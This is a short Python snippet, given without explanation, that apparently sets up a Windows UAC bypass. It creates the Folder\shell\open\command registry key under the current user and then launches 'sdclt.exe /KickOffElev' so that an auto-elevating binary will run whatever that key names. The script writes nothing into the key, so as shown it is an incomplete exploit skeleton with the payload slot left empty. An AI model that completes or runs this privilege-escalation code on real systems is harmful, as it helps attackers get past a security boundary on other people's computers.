import winreg, subprocess
with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command') as key:
    pass
subprocess.run(['sdclt.exe', '/KickOffElev'])
